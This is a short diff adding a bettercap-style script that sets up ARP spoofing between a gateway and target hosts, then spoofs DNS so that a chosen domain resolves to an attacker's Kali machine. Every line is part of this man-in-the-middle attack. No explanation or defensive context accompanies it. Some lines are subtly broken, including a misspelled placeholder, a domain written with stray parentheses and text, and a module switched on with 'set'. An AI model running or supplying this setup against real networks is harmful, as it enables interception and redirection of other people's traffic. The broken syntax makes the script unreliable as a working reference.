@@ -1,0 +1,8 @@
+set arp.spoof.targets gatewayIP, targetIP1,taegetIP2
+set arp.spoof.internal true
+set arp.spoof.fullduplex true
+arp.spoof on
+set dns.spoof.all true
+set dns.domains mydomain (good.bodo.com)
+set dns.spoof.address  kaliIP or attackerIP
+set dns.spoof on
